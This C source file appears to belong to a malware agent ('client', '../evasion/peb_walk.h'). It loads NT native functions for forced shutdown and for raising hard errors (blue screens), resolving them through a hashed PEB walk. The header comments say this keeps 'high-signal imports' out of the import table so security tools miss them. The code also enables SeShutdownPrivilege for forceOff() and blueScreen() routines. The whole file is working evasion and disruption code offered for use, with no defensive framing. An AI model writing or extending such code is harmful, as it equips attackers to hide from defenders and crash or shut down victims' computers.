/*
 * client/ntcalls.c  –  NT syscall loader and privilege check
 * ===========================================================
 * Implements ntcalls_load() and ntcalls_verify() declared in ntcalls.h.
 * All NT function pointer globals are defined here.
 *
 * IAT-clean: GetModuleHandleW and GetProcAddress replaced with PEB walk so
 * those high-signal imports do not appear in the agent's import table.
 */

#include "ntcalls.h"
#include "../evasion/peb_walk.h"

/* ── Global NT function pointers (all start NULL) ───────────────────────── */
NTSTATUS (NTAPI *RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = NULL;
NTSTATUS (NTAPI *NtShutdownSystem)(_In_ SHUTDOWN_ACTION)                = NULL;
NTSTATUS (NTAPI *NtSetSystemPowerState)(_In_ POWER_ACTION,
                                         _In_ SYSTEM_POWER_STATE,
                                         _In_ ULONG)                    = NULL;
NTSTATUS (NTAPI *NtRaiseHardError)(NTSTATUS, ULONG, ULONG,
                                    PULONG_PTR, ULONG, PULONG)          = NULL;

ULONG g_hardErrorResponse = 0;


/* ── ntcalls_load ───────────────────────────────────────────────────────── */

BOOL ntcalls_load(void)
{
    /* Resolve ntdll via PEB walk — no GetModuleHandleW in IAT */
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) return FALSE;

    /* Resolve each function via export table walk — no GetProcAddress in IAT */
    RtlAdjustPrivilege    = (PVOID)peb_get_export(hNtdll, peb_hash_str("RtlAdjustPrivilege"));
    NtShutdownSystem      = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtShutdownSystem"));
    NtSetSystemPowerState = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtSetSystemPowerState"));
    NtRaiseHardError      = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtRaiseHardError"));

    /*if (!RtlAdjustPrivilege || !NtShutdownSystem || // #this comment out is being debugged, will be cleaned up when resolved
        !NtSetSystemPowerState || !NtRaiseHardError)
        return FALSE;*/
    if(!RtlAdjustPrivilege)     return 0xBEEF1;
    if(!NtShutdownSystem)       return 0xBEEF2;
    if(!NtSetSystemPowerState)  return 0xBEEF3;
    if(!NtRaiseHardError)       return 0xBEEF4;
  
    return TRUE;
}


/* ── ntcalls_verify ─────────────────────────────────────────────────────── */

BOOL ntcalls_verify(void)
{
    /* All four pointers must have resolved */
    if (!RtlAdjustPrivilege)    return 0xDEAD1;
    if (!NtShutdownSystem)      return 0xDEAD2;
    if (!NtSetSystemPowerState) return 0xDEAD3;
    if (!NtRaiseHardError)      return 0xDEAD4;

    /*
     * Attempt to acquire SeShutdownPrivilege (privilege index 19).
     * This is non-fatal: if we don't have it, forceOff() and blueScreen()
     * will simply fail silently at call-time.
     * NOTE: RtlAdjustPrivilege returns STATUS_SUCCESS (0) on success.
     *       The original code checked `if (NtReceiver) return;` which
     *       exited on SUCCESS and continued on FAILURE — that was backwards.
     */
    BOOLEAN  prevState = FALSE;
    NTSTATUS ns = RtlAdjustPrivilege(19, TRUE, FALSE, &prevState);
    (void)ns; /* non-fatal; do not gate the return value on this */

    return TRUE;
}
